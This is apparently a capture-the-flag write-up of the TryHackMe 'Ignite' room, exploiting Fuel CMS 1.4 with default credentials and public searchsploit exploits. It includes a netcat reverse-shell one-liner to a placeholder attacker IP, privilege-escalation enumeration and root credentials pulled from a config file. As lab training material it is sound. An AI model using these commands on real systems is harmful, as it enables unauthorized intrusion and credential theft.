# TryHackMe — Ignite WriteUp

<img width="743" height="338" alt="Pasted image 20251001154221" src="https://github.com/user-attachments/assets/0676deda-4537-4e21-9c67-9e3f636a53fa" /> <br>

**Room:** [Ignite](https://tryhackme.com/room/ignite) <br>
**Category:** Web Application Exploitation <br>
**Description:** This room is a CTF to exploit a vulnerable Fuel CMS web application.<br>


## Tools
- **Nmap -** service and version discovery
- **Searchsploit -** local exploit database lookup
- **Python 3 -** run exploitation scripts and stabilizing shells
- **netcat (nc) -** listener for reverse shells
- **Custom exploit scripts -** (from Searchsploit results)

## Target
IP: `10.201.57.235` (exported as an environment variable for convenience)
```bash
# Set target IP for easier command reuse
export IP=10.201.57.235
```


# Phase 1: Enumeration & Recon

To start I performed an Nmap scan to identify open ports and services:
```bash
nmap -sV -sC -sS -T4 $IP
```

<img width="587" height="324" alt="Pasted image 20250926111202" src="https://github.com/user-attachments/assets/e8db4b2c-142b-46cc-81a6-9d1796e7f462" />

### Nmap findings:
- Port **80** open (HTTP).
- HTTP title and headers reveal **Fuel CMS**.
- `Disallow: /fuel/` entry was present in robots.txt

When I visited the site it shows Fuel CMS **Version 1.4** and default admin credentials on the page. **Username: admin / Password: admin**: <br><br>
<img width="1917" height="925" alt="Pasted image 20250926112213" src="https://github.com/user-attachments/assets/ffd14ada-5152-4269-8d29-44d886701ab1" />

<img width="502" height="133" alt="Pasted image 20250926112513" src="https://github.com/user-attachments/assets/8c0c6620-f318-4ed0-ba87-45b9f1ea5f3a" />


# Phase 2: Exploitation

I navigated to `/fuel/` and used the default credentials to log in to the admin account: <br><br>
<img width="1919" height="961" alt="Pasted image 20250926112819" src="https://github.com/user-attachments/assets/c18a03b6-811f-4e2c-8505-53d59b4f949a" />

<br>

<img width="9919" height="1092" alt="Pasted image 20250926112848" src="https://github.com/user-attachments/assets/a57e2851-8fdb-4ad0-aa2b-9b3dac9fa4a8" />

I attempted to upload a PHP file via the admin UI but received:<br><br>
> "There was an error uploading your file. Please make sure the server is setup to upload files of this size and folders are writable."

This suggested either upload restrictions or non-writable directories is on this web app:<br><br>
<img width="3175" height="364" alt="Pasted image 20250926114833" src="https://github.com/user-attachments/assets/faae95e4-0861-4fc4-beb5-e68c50e853ef" />

### Searching for known vulnerabilities
I used `searchsploit` to find public exploits for Fuel CMS v1.4 and tested multiple results against the webapp: <br><br>
<img width="739" height="208" alt="Pasted image 20250926121629" src="https://github.com/user-attachments/assets/9d296614-8828-4261-ba21-0feed5ab2a8f" />

Tried `47138.py` and it failed with an error: <br><br>
<img width="616" height="74" alt="Pasted image 20250926125013" src="https://github.com/user-attachments/assets/dd9ddd3a-4f41-40da-8d15-9d392aababe5" />

Then tried `50477.py` next and this resulted in shell access: <br><br>
<img width="455" height="390" alt="Pasted image 20250926125359" src="https://github.com/user-attachments/assets/5e429a7c-9e94-43da-aaef-7df1e0e6a4a3" />

With this exploit I was able to get a shell but it mostly returns 'system' with the cd and sudo command. The exploit produced a limited (dummy / non-interactive) shell that returned little output for commands like `cd` and `sudo`. I then worked to obtain a fully interactive shell: <br><br>
<img width="455" height="390" alt="Pasted image 20250926125359" src="https://github.com/user-attachments/assets/cf656699-e7e8-48de-800c-7b0b70cd81f8" />


### Stabilizing an interactive shell

I opened another terminal and started a netcat listener: <br><br>
<img width="318" height="82" alt="Pasted image 20250926134102" src="https://github.com/user-attachments/assets/3460b7d5-a705-4c35-8c32-d97642953d89" />

In the dummy shell I ran this command, one-line reverse shell :
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_IP> 4444 > /tmp/f

# replace <attacker_IP> to my IP
```

After establishing a stable shell, I enumerated the filesystem and found the first flag under `/home/www-data`:<br><br>
<img width="373" height="527" alt="Pasted image 20250926135037" src="https://github.com/user-attachments/assets/fa84b372-db49-489f-9246-2173108cd1e5" />


# Phase 3: Privilege Escalation
Performed standard enumeration:
```bash
hostname
uname -a
whoami
ps aux
env
find / -type f -perm /4000 2>/dev/null
find /etc -type f -readable 2>/dev/null
```
<img width="679" height="78" alt="Pasted image 20250926141711" src="https://github.com/user-attachments/assets/6597e6fd-b3c0-449f-80aa-f93144a74ceb" /> <br>
<img width="470" height="486" alt="Pasted image 20250930111639" src="https://github.com/user-attachments/assets/4eab2228-7ccd-4c58-9de6-424ca273a41f" /> <br><br>

Initial enumeration showed standard users and `/etc/passwd` was readable and I was able to confirm `www-data` and `root` users:<br><br>
<img width="521" height="514" alt="Pasted image 20250926141315" src="https://github.com/user-attachments/assets/9bf63cfd-6a0c-406b-ab58-62c02b62fe04" />

<img width="562" height="533" alt="Pasted image 20250926142115" src="https://github.com/user-attachments/assets/72ff0ff0-d582-440f-8468-9eef873a7bdf" /> <br><br>

Revisited the site content (previously observed pages/assets) and carefully searched for mentions of passwords.

I revisited the site because I remember observing that there was an assets directory in it. On the home page I found instructions referencing a password location. I searched for "password" and it led me to identify the instructions to access config `fuel/application/config/database.php`, which contained root credentials:
<br><br>
<img width="1919" height="928" alt="Pasted image 20250930114003" src="https://github.com/user-attachments/assets/b3819b44-0d54-47f8-9d80-450847c358e6" /> <br><br>

I navigated to the location `fuel/application/config/database.php`. and retrieved credentials to the root user:<br><br>
<img width="464" height="421" alt="Pasted image 20250930114046" src="https://github.com/user-attachments/assets/ab8a9d5d-e1a4-4031-a2b2-7e5f6a71d02e" />

The shell needed to update with a proper TTY. I spawned a proper TTY to get root, I ran:
```bash
python3 -c 'import pty, os; pty.spawn("/bin/bash")'
```
<br><br>
After getting into root, I was able to identify the file `root.txt` and it had the final flag in there: <br><br>
<img width="433" height="346" alt="Pasted image 20250930115328" src="https://github.com/user-attachments/assets/033d4e4f-d32c-4916-ad06-081c387fba2b" />



# Takeaways
- **Read everything on the target site**. Publicly visible default credentials and page instructions led directly to admin access and critical paths.
- **Security misconfiguration is a primary weakness.** This host exhibited insecure defaults and sensitive information exposure (OWASP: Security Misconfiguration / Sensitive Data Exposure).
- **Utilize shell stability** because the exploit that worked for me gave me access but it had limited functionality. Converting the non-interactive shells using netcat, PTY, TTY spawn was necessary.
- **Trial and error** for version-specific exploits. It is necessary for me to be prepared to try multiple exploits and handle failures.
